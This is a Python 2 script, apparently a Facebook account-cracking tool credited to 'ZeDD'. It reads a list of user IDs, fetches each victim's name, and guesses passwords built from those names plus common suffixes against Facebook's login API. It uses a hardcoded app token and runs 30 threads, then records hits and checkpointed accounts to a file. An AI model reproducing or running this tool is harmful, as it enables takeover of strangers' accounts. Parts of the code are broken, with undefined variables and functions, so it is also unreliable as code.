#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
\033[1;96m█████████
\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mZeDD
\033[1;96m█████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
              \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
\033[1;31m ╔═════════════════════════════════════════════╗
\033[0;31m ║\033[0;33m\033[1;33m* AUTHOR  : \033[1;39mZeDD.                            \033[1;31m║
\033[0;31m ║\033[0;33m\033[1;33m* FACEBOOK: \033[1;39mhttps://m.facebook.com/Ohii.Jutt \033[1;31m║
\033[0;31m ║\033[0;33m\033[1;33m* GITHUB  : \033[1;39mhttps://Github.com/Em710         \033[1;31m║
\033[0;31m ╚═════════════════════════════════════════════╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mLoading Please Wait\x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
\033[1;96m█████████
\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mZeDD
\033[1;96m█████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
              \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
\033[1;31m ╔═════════════════════════════════════════════╗
\033[0;31m ║\033[0;33m\033[1;33m* AUTHOR  : \033[1;39mZeDD.                            \033[1;31m║
\033[0;31m ║\033[0;33m\033[1;33m* FACEBOOK: \033[1;39mhttps://m.facebook.com/Ohii.Jutt \033[1;31m║
\033[0;31m ║\033[0;33m\033[1;33m* GITHUB  : \033[1;39mhttps://Github.com/Em710         \033[1;31m║
\033[0;31m ╚═════════════════════════════════════════════╝"""

CorrectUsername = "Zee"
CorrectPassword = "Zee"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME \x1b[1;96m➺ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD \x1b[1;96m➺ ")
        if (password == CorrectPassword):
            print "Logged in Successfully as " + username
            loop = 'false'
        else:
            print "Serious Please"
            os.system('xdg-open https://www.Facebook.com/Kudiyan.Da.Prince')
    else:
        print "Wrong Dear!"
        os.system('xdg-open https://www.Facebook.com/Kudiyan.Da.Prince')
        
	os.system('clear')
	print logo
	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m Crack With Lists Of IDz"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m╰══•➢ \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
		
		
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;97m═"
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mFile ni milli'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill In Correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[0;32mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[0;32mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[0;32mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[0;32mStop CTRL+z')
	print 42*"\033[1;97m═"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 +' ==> ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 +' ==> ' + b['name']
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 +' ==> ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 +' ==> ' + b['name']
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 +' ==> ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 +' ==> ' + b['name']
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 +' ==> ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 +' ==> ' + b['name']
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['last_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 +' ==> ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5 +' ==> ' + b['name']
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 +' ==> ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 +' ==> ' + b['name']
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['first_name']+'786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 +' ==> ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 +' ==> ' + b['name']
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name']+'786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 +' ==> ' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8 +' ==> ' + b['name']
																			cek = open("out/super_cp.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																		else:
																			pass9 = b['first_name']+'302'
																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			q = json.load(data)
																			if 'access_token' in q:
																				print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 +' ==> ' + b['name']
																				oks.append(user+pass9)
																			else:
																				if 'www.facebook.com' in q["error_msg"]:
																					print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9 +' ==> ' + b['name']
																					cek = open("out/super_cp.txt", "a")
																					cek.write(user+"|"+pass9+"\n")
																					cek.close()
																					cekpoint.append(user+pass9)
																				else:
																					pass10 = ('Pakistan')
																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																					q = json.load(data)
																					if 'access_token' in q:
																						print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 +' ==> ' + b['name']
																						oks.append(user+pass10)
																					else:
																						if 'www.facebook.com' in q["error_msg"]:
																							print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10 +' ==> ' + b['name']
																							cek = open("out/super_cp.txt", "a")
																							cek.write(user+"|"+pass10+"\n")
																							cek.close()
																							cekpoint.append(user+pass10)
																						else:
																							pass11 = ('786786')
																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																							q = json.load(data)
																							if 'access_token' in q:
																								print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 +' ==> ' + b['name']
																								oks.append(user+pass11)
																							else:
																								if 'www.facebook.com' in q["error_msg"]:
																									print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11 +' ==> ' + b['name']
																									cek = open("out/super_cp.txt", "a")
																									cek.write(user+"|"+pass11+"\n")
																									cek.close()
																									cekpoint.append(user+pass11)
																								else:
																									pass12 = ('000786')
																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																									q = json.load(data)
																									if 'access_token' in q:
																										print '\x1b[1;96m[\x1b[1;92mSuccess\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 +' ==> ' + b['name']
																										oks.append(user+pass12)
																									else:
																										if 'www.facebook.com' in q["error_msg"]:
																											print '\x1b[1;96m[\x1b[1;93m7Days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12 +' ==> ' + b['name']
																											cek = open("out/super_cp.txt", "a")
																											cek.write(user+"|"+pass12+"\n")
																											cek.close()
																											cekpoint.append(user+pass12)
															
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        print""" \033[1;96m

                  `.-://////:-.`
              .:+o+:-..````..-:+o+:.
           `:o+-`                `:+o:`
         `/o:`                      `:o/`
        -s/`  .-..`            `..--` `/s-
       /o.   `:.`.-:----------:-.``:-   .o/
      /o`    .:`    `              --    `o/
     -s.     .:`                   --     .s-
     o/     .:`                     --     +o
    .s-     :.        \033[1;91mZeDD          `:`    -s`
    .s.     :.                      `:`    .s.
    .s-     --                      .:     -s.
     o/     `-.                    `-.     /o
     -s.     `--`                `.-`     .s-
      /o` ----``..--..`    `...--.`      `o/
       /o. `----`  `-.      `-.         .o/
        -o:  -.......        ..       `:o-
         `:o:``....--        ..     `:o:`
           `:+/-`  `-        ..  `-/+:`
              `-/+///..````..://+/-`
                  `.-::////::-.` \033[91;1m

                \033[90;1mLife Of Programmer\033[91;1m
             Powered by:\033[97m Mr. ZeDD """
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mDone \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/ZeDD.txt")
	raw_input("\n\033[1();96m[\033[1;97mBack\033[1;96m]")
	super()
